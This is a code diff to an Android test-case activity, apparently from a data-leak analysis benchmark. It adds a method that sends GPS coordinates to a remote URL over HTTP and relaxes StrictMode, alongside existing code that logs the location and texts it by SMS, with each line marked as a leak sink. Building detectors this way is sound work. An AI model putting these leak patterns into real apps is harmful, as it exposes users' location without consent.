@@ -6,9 +6,18 @@ import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
 import android.os.Bundle;
+import android.os.StrictMode;
 import android.telephony.SmsManager;
 import android.util.Log;
 import android.widget.Toast;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+
 /**
  * @testcase_name AnnonymousClass1
  * @version 0.1
@@ -52,13 +61,44 @@ public class AnnonymousClass1 extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_annonymous_class1);
+
+		if (android.os.Build.VERSION.SDK_INT > 9) {
+			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
+			StrictMode.setThreadPolicy(policy);
+		}
         
         // Acquire a reference to the system Location Manager
  		locationManager = (LocationManager)getSystemService(Context.LOCATION_SERVICE);
        
  		// Register the listener with the Location Manager to receive location updates
  		locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 10, locationListener);		 
-    }  
+    }
+
+	private void connect(String data) throws IOException {
+		String URL = "http://www.google.de/search?q=";
+		URL = URL.concat(data);
+		java.net.URL url = new URL(URL);
+		HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
+		conn.setRequestMethod("GET");
+		conn.setDoInput(true);
+		// Starts the query
+		conn.connect();
+
+		InputStream is = conn.getInputStream();
+		if (is == null)
+			return;
+		StringBuilder sb = new StringBuilder();
+		BufferedReader br = new BufferedReader(new InputStreamReader(is));
+		String line = null;
+		try {
+			while ((line = br.readLine()) != null)
+				sb.append(line);
+		} finally {
+			br.close();
+			is.close();
+		}
+		Log.d(getClass().getSimpleName(), sb.toString());
+	}
     
     @Override
 	protected void onResume(){
@@ -66,5 +106,11 @@ public class AnnonymousClass1 extends Activity {
 		Log.i("LOG", "Latitude: " + latitude + "Longtitude: " + longitude); //sink, two leaks
 		SmsManager sms = SmsManager.getDefault();
 		sms.sendTextMessage("+49", null, "Latitude: " + latitude + "Longtitude: " + longitude, null, null);  //sink, leak
+
+		try {
+			connect("Latitude" + latitude + "Longtitude" + longitude);
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
 	}
 }
